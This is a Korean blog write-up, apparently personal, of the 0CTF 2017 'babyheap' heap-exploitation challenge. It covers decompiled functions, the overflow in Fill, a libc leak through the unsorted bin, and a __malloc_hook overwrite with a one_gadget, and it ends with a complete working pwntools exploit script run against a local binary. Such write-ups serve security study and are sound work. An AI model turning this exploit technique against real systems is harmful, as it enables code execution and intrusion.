---
title: "[0CTF 2017 Quals pwn] babyheap writeup"
published: 2026-06-21
description: 즐거운 공부
category: CTF
tags: [CTF, writeup, 0CTF2017]
draft: false
---

# 0CTF 2017 Quals pwn babyheap writeup
어서와라!!! 매우 긴 시간동안 농땡이 피우다가 돌아온 나다.
늘 그렇듯, 이번에도 정형식이 따로 없는 writeup이다.

문제 분야는 pwn, 플래그 형식은 flag{}이다.

## 정적 분석 ㄱ
자, 파일을 둘러보자. 나에게는 무려 AI 선배님들을 통해 다뤄진 실전 AI스러운 명령어들이 넘쳐난다.
```bash
file babyheap 
babyheap: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped

checksec --file=./babyheap
[*] '/home/bankai/testplace/babyheap'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

딱봐도 힙 문제다. 힙 문제가 틀림없다 이말이야.

```bash
strings -tx ./babyheap | grep GCC
   2010 GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
```
환경도 구했다. 왜 구했을까? 이미 널린 게 롸업인데..  
그야 보는 걸 "잊어버렸기" 때문이다. 풀이를 보고 풀던가, 하려 했다.  

그런데 이게 어찌된 일일까, 그냥 CTF 하는 중이라고 착각하고 풀어버렸네?  
`16.04`같은 경우는 따로 쓸모있는 이미지 받아와서 잘 썼다.

원래는 기드라를 쓰고 있었거든요?...  
갑자기 내게 `IDA Pro 9.3`이 떨어져 버렸네?...  

## IDA PRO!!!!!
Ah, 분석은 님들이 알아서 하세요 ㅎ.  
저는 이미 구조체 적당히 만들어놔서, 이거 쓸 겁니다.  
리네임/리타입도 알아서들 하시고 그래그래

```c
__int64 __fastcall main(char *a1, char **a2, char **a3)
{
  Chunk *chunks; // [rsp+8h] [rbp-8h]

  chunks = (Chunk *)custom_heap_init();         // 커스텀 힙 ASLR
  while ( 1 )
  {
    print_menu();                               // 메뉴
    switch ( get_input() )
    {
      case 1LL:
        Allocate(chunks);
        break;
      case 2LL:
        Fill((__int64)chunks);
        break;
      case 3LL:
        Free((__int64)chunks);
        break;
      case 4LL:
        Dump((__int64)chunks);
        break;
      case 5LL:
        return 0;                               // exit
      default:
        continue;
    }
  }
}
```

ㄹㅇㅋㅋ 개전형적인 힙 노트 문제 엌ㅋㅋㅋㅋㅋㅋㅋ  

```bash
===== Baby Heap in 2017 =====
/dev/urandom
1. Allocate
2. Fill
3. Free
4. Dump
5. Exit
Command:
```

`strings`로 이미 메뉴 문자열 같은 건 대충 봤고.
음, 빠르게 `생성/채움/해제/덤프/`를 둘러보기 ㄱㄱ.  

### Allocate
```c
void __fastcall Allocate(Chunk *a1)
{
  int i; // [rsp+10h] [rbp-10h]
  int input; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !a1[i].in_use )
    {
      printf("Size: ");
      input = get_input();
      if ( input > 0 )
      {
        if ( input > 4096 )
          input = 4096;
        v3 = calloc(input, 1u);
        if ( !v3 )
          exit(-1);
        a1[i].in_use = 1;
        a1[i].size = input;
        a1[i].ptr = v3;
        printf("Allocate Index %d\n", i);
      }
      return;
    }
  }
}
```
`Allocate`는 비겁하게 **calloc**을 쓴다. 즉 처음 만든 놈은 릭이 불가능함ㅉ.  
최대 4096바이트까지 할당 가능하고, `in_use`랑 `size`, `ptr`을 사용함.  

약간 커스텀 힙 느낌이라는 게 딱 오죠? 허나 그건 중요하지 않아.  

### Fill
```c
void __fastcall Fill(Chunk *a1)
{
  unsigned int input; // [rsp+18h] [rbp-8h]
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  input = get_input();
  if ( input < 0x10 && a1[input].in_use == 1 )
  {
    printf("Size: ");
    v2 = get_input();
    if ( v2 > 0 )
    {
      printf("Content: ");
      read_byte2((__int64)a1[input].ptr, v2);
    }
  }
}
```

청크 수는 최대 `0x10`, 16개까지 가능.  
`size` 검사도 철저하구만, 근데 tq 사이즈 제한이 없으시네? 만들 때는 있더만?!?!?!?  

### Free
```c
void __fastcall Free(Chunk *a1)
{
  unsigned int input; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  input = get_input();
  if ( input < 0x10 && a1[input].in_use == 1 )
  {
    a1[input].in_use = 0;
    a1[input].size = 0;
    free(a1[input].ptr);
    a1[input].ptr = nullptr;
  }
}
```

정석적인 구현이다. 누가 봐도 그렇게 말할 것 처럼.  
인덱스 검사, 그리고 `in_use` 플래그 검사해서 해제 여부가 결정됨.  
포인터까지 날라가서 "오잇 ㅅㅂ? 이거 문제 있는 거 맞음?" 이라는 의문이 생겨도 이상하지 않을 정도.  

### Dump
```c
void __fastcall Dump(Chunk *a1)
{
  unsigned int idx; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  idx = get_input();
  if ( idx < 0x10 && a1[idx].in_use == 1 )
  {
    puts("Content: ");
    write_out(a1[idx].ptr, a1[idx].size);
    puts(byte_14F1);
  }
}
```
똑같은 검증, 그리고 `write_out`으로 내용을 출력함.  

## 레전드 익스 시작
자, 필요한 정보는 모두 주어졌다. 뭘 망설이고 있는가?  
코드가 긴가? 아니다.  
복잡한 수식이 있는가? 아니다.  
더군다나, 그리 어려운 개념도 아니고 고작 힙, 그것들 중 `glibc 2.23`따리다.  

잡설이 길었군, 빠르게 마저 끝내주마.  

근거는 알아서들 찾아라,  
언급은 하지 않았지만 `mmap`된 메타데이터 배열친구는 **ASLR**이 한 번 더 적용되는 놈이라,  
대놓고 `libc` 쪽 노리라는 걸 파악할 수 있다. 걍 그렇다고 ㅇㅇ..  

먼저 청크를 **4개**(0, 1, 2, 3) 정도 준비하고,  
0번 청크 오버플로우 -> 1번 청크 크기 조작  
이 커다란 1번(0x120)을 `free`로 해제하면 `unsorted bin`에 가게 됨.  
근데 얘를 할당 받는다? 딱 반으로 갈려서 1에는 정상인데, 뒷부분은 `unsorted bin`에 있어서  
2번 조회하면 딱 `fd`를 읽어버릴 수가 있으심.  

이게 `main_arena+0x58`인데 걍 `libc` 매핑 주소 빼서 오프셋 구하고  
릭 주어지면 이걸로 `libc_base` 정하면 됨.  

그럼 `system`을 호출하면 되겠지?  
놉놉. 스택 bof 없고, 리턴 주소 **primitive** 도 없다 이거야.  

그니까 우린 적당한 원가젯 찾아서  
`__malloc_hook`을 덮어쓰면 됨. 그럼 쉘 따란~

익스코드를 바로 내려버리고, 끝내도록 하겠음.  
..하지만 `__free_hook`도 덮어봐야..하지 않을까?

이건 알아서들 하시고 ㅉ

---
# EXPLOIT

```python
from pwn import *

context.binary = elf = ELF('./babyheap')
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "debug"

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

HOST = "localhost"
PORT = 1337

def menu(option):
	p.sendlineafter(b'Command: ', str(option).encode())

def alloc(size):
	menu(1)
	p.sendlineafter(b'Size: ', str(size).encode())

def fill(idx, data):
	menu(2)
	p.sendlineafter(b'Index: ', str(idx).encode())
	p.sendlineafter(b'Size: ', str(len(data)).encode())
	p.sendlineafter(b'Content: ', data)

def free(idx):
	menu(3)
	p.sendlineafter(b'Index: ', str(idx).encode())

def dump(idx):
	menu(4)
	p.sendlineafter(b'Index: ', str(idx).encode())
	p.recvuntil(b'Content: \n')
	return p.recvline()

p = process()
#p = remote(HOST, PORT)
#gdb.attach(p)

def slog(n, a): return success(": ".join([n, hex(a)]))

alloc(0x80)
alloc(0x80)
alloc(0x80)
alloc(0x80)
pause()

fill(0, b'A'*0x80 + p64(0) + p64(0x121))
pause()

free(1)
pause()

alloc(0x80)
pause()

leak = u64(dump(2)[:8])
slog("leak", leak)

lb = leak - 0x3c4b78
slog("libc_base", lb)

libc.address = lb
malloc_hook = libc.sym["__malloc_hook"]
slog("malloc_hook", malloc_hook)


og = lb + 0x4526a
slog("working one_gadget", og)

# carve 0x70 from 0x90 unsorted bin chunk
alloc(0x60)

# free that
free(4)
pause()

fill(2, p64(malloc_hook-0x23))

alloc(0x60)
alloc(0x60)

fill(5, b'\x00'*0x13 + p64(og))

p.sendlineafter(b'Command: ', b'1')
p.sendlineafter(b'Size: ', b'1')

p.interactive()
```

적당히 환경 맞게 돌렸다 ㅉㅉ.  
끝내면서,  

왜 내가 지금까지 여기에 글을 올리지 않았을까?  
답은 간단하다. 생각보다 계획대로 되지 않았기 때문이지 ㅋ.  

지금껏 나간 `CTF` 롸업도  
추가되어 이곳에 올라올 예정이다.  

개인적으로 공부할 게 많다. 좋긴 한데,,, 아 아무튼 좋은거임 ㅇㅇ;
